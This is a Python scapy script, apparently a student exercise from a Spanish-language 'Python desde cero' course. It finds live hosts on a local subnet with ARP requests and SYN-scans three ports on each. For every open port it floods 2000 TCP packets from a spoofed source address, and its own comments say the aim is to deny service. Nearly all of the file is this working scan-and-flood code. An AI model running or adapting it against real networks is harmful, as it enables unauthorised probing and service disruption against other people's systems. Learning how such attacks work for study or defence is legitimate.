###################################################
#                DESAFIO SCAPY                    #
###################################################
#                                                 #
#       Autor: Ruben Maldonado                    #
#       Curso: Python desde cero                  #
###################################################

try:
    import logging

    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # Que no muestre warning
    from scapy import all as scapy
    import os
    import time
except ModuleNotFoundError as me:
    print("Faltan modulos: " + me.__str__())
    exit()

scapy.conf.verb = 0 #Que no muestre datos en pantalla
#listaPuertos = list(range(8000, 8100))  # Lista de puertos a escanear
listaPuertos = [80,8080,8100] #se acota a estos tres puertos para las pruebas
listaIp =  list(range(0, 100)); #se acota a este rango de ip

def limpiarPantalla():
    os.system("cls")

def sendPackage(ipDestino, puertoDestino, cantPack):
    IP_ORIGEN= "192.168.0.45"
    puertoOrigen = scapy.RandShort()#para que el paquete enviado tenga un puerto distinto cada vez

    print("\nComienza envio de paquetes a " + ipDestino)

    scapy.send(scapy.IP(src=IP_ORIGEN, dst=ipDestino) / scapy.TCP(sport=puertoOrigen , dport=puertoDestino), count = cantPack)

    print("Finaliza envio de paquetes a " + ipDestino)

#SynScan
def escanearPuertos(host):
    print("\nEscaneando los puertos de la IP:", host)
    try :
        for puerto in listaPuertos:
            puertoOrigen = scapy.RandShort()#para que el paquete enviado tenga un puerto distinto cada vez
            paquete = scapy.IP(dst=host) / scapy.TCP(sport=puertoOrigen, dport=puerto, flags="S")
            respuesta = scapy.sr1(paquete, timeout=2)
            if ("NoneType" in str(type(respuesta))):
                pass
            elif (respuesta.haslayer(scapy.TCP) and respuesta.getlayer(scapy.TCP).flags == 0x12):
                p = scapy.IP(dst=host) / scapy.TCP(sport=puertoOrigen, dport=puerto, flags="R")
                rst = scapy.sr(p, timeout=1) #envío con flag RST activa para cortar la conexión
                try:
                    servicio = scapy.socket.getservbyport(puerto)# obtiene info del puerto(si es conocido)
                except:
                    servicio = "¿?"
                print("[ABIERTO]", puerto, " -> ", servicio)
                sendPackage(host, puerto, 2000) # si existe un puerto abierto, se envían paquetes para "denegar" el servicio
    except KeyboardInterrupt:
            print("Abortado por usuario")

def getTarget():
    targetsOnline = []

    for ip in listaIp:
        try:
            dirIp = str("192.168.0.") + str(ip)
            scan = scapy.sr1(scapy.ARP(pdst=str(dirIp)), timeout=1, verbose=0)
            if scan == None:
                pass
            else:
                print("Posible objetivo encontrado en " + dirIp)
                targetsOnline.append(dirIp)
        except KeyboardInterrupt:
            print("Abortado por usuario")

    return targetsOnline

def main():
    limpiarPantalla()
    print("\nComienza ejecucion...\n");

    inicio = time.time()

    targets = getTarget()

    for host in targets:
        escanearPuertos(host)

    tiempoEjecucion = time.time() - inicio
    print("\nEjecucion realizada en " + str(tiempoEjecucion) + " [s]")

if __name__ == '__main__':
    try:
        main()
    except BaseException as be:
        print("\nHa ocurrido un error: " + be.__str__());